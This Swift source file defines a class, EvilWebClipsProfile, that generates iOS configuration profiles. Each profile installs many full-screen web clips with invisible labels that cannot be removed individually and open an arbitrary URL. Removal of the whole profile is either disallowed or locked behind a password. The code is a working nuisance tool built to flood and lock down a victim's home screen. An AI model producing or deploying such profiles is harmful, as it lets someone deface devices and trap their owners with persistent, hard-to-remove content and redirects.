/*
The MIT License (MIT)

Copyright (c) 2017 Daniel Illescas Romero <https://github.com/illescasDaniel>

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
*/

import AppKit

class EvilWebClipsProfile {
	
	private var keys: Set<String> = []
	private var webClips: Set<String> = []
	
	// Options
	var profileName: String
	var url: String
	var alias: String
	var clipsCount: UInt
	var password: String?
	var consentText: String?
	var descriptionText: String
	var organizationText: String
	var iconPath: String?
	
	init(profileName: String, url: String, alias: String, clipsCount: UInt, password: String? = nil,
	     consentText: String? = nil, descriptionText: String = "", organizationText: String = "", iconPath: String? = nil) {
		self.profileName = profileName
		self.url = url
		self.alias = alias
		self.clipsCount = clipsCount
		self.password = password
		self.consentText = consentText
		self.descriptionText = descriptionText
		self.organizationText = organizationText
		self.iconPath = iconPath
	}
	
	func save(to path: String = FileManager.default.homeDirectoryForCurrentUser.appendingPathComponent("Desktop/").path) {
		
		repeat {
			keys.insert(randomID())
		} while keys.count < clipsCount
		
		var allClips = ""
		
		for key in keys {
			
			var encodedImage: String? = nil
			
			if let iconPath = self.iconPath, let image = NSImage(byReferencingFile: iconPath) {
				encodedImage = image.tiffRepresentation?.base64EncodedString()
			}
			
			let webClip = """
			<dict>
			<key>FullScreen</key>
			<true/>
			\(self.iconPath != nil ? """
			<key>Icon</key>
			<data>
			\(encodedImage ?? "")
			</data>
			""" : "")
			<key>IsRemovable</key>
			<false/>
			<key>Label</key>
			<string>⠀</string>
			<key>PayloadDescription</key>
			<string>Configures settings for a web clip</string>
			<key>PayloadDisplayName</key>
			<string>Web Clip</string>
			<key>PayloadIdentifier</key>
			<string>com.apple.webClip.managed.\(key)</string>
			<key>PayloadType</key>
			<string>com.apple.webClip.managed</string>
			<key>PayloadUUID</key>
			<string>\(key)</string>
			<key>PayloadVersion</key>
			<integer>1</integer>
			<key>Precomposed</key>
			<false/>
			<key>URL</key>
			<string>\(url)</string>
			</dict>
			"""
			
			webClips.insert(webClip)
		}
		
		for webClip in webClips {
			allClips += webClip + "\n"
		}
		
		var passwordRemovalID = randomID()
		var payloadID = randomID()
		var configurationPayloadUUID = randomID()
		
		repeat {
			passwordRemovalID = randomID()
			payloadID = randomID()
			configurationPayloadUUID = randomID()
		} while (passwordRemovalID == payloadID) || (passwordRemovalID == configurationPayloadUUID) || (payloadID == configurationPayloadUUID)
		
		write(file: "\(profileName).mobileconfig", to: path) {
			"""
			<?xml version="1.0" encoding="UTF-8"?>
			<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
			<plist version="1.0">
			<dict>
			\(self.consentText != nil ? """
			<key>ConsentText</key>
			<dict>
			<key>default</key>
			<string>\(self.consentText ?? "Consent Message")</string>
			</dict>
			""" : "")
			\(self.password != nil ? "<key>HasRemovalPasscode</key><true/>" : "")
			<key>PayloadContent</key>
			<array>
			\(self.password != nil ? """
			<dict>
			<key>PayloadDescription</key>
			<string>Configures a password for profile removal</string>
			<key>PayloadDisplayName</key>
			<string>Profile Removal</string>
			<key>PayloadIdentifier</key>
			<string>com.apple.profileRemovalPassword.\(passwordRemovalID)</string>
			<key>PayloadType</key>
			<string>com.apple.profileRemovalPassword</string>
			<key>PayloadUUID</key>
			<string>\(passwordRemovalID)</string>
			<key>PayloadVersion</key>
			<integer>1</integer>
			<key>RemovalPassword</key>
			<string>\(self.password ?? "0000")</string>
			</dict>
			""" : "")
			\(allClips)
			</array>
			<key>PayloadDescription</key>
			<string>\(descriptionText)</string>
			<key>PayloadDisplayName</key>
			<string>\(profileName)</string>
			<key>PayloadIdentifier</key>
			<string>Daniel.C2DAEC38-5EC0-4226-9D03-68AEDF72A4B8</string>
			<key>PayloadOrganization</key>
			<string>\(organizationText)</string>
			<key>PayloadRemovalDisallowed</key>
			<\((self.password == nil) ? true : false)/>
			<key>PayloadType</key>
			<string>Configuration</string>
			<key>PayloadUUID</key>
			<string>\(configurationPayloadUUID)</string>
			<key>PayloadVersion</key>
			<integer>1</integer>
			</dict>
			</plist>
			"""
		}
	}
	
	// Convenience
	
	private func randomString(length: Int) -> String {
		let charSet = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
		let characters = charSet.characters.map { String($0) }
		var finalStr = ""
		for _ in (0..<length) {
			finalStr.append(characters[Int(arc4random()) % characters.count])
		}
		return finalStr
	}
	
	private func write(file: String, to directory: String, content: () -> String) {
		
		do {
			try content().write(toFile: "\(directory)/\(file)", atomically: true, encoding: .utf8)
		}
		catch {
			print(error)
		}
	}
	
	private func randomID() -> String {
		return "\(randomString(length: 8))-\(randomString(length: 4))-\(randomString(length: 4))-\(randomString(length: 12))"
	}
}
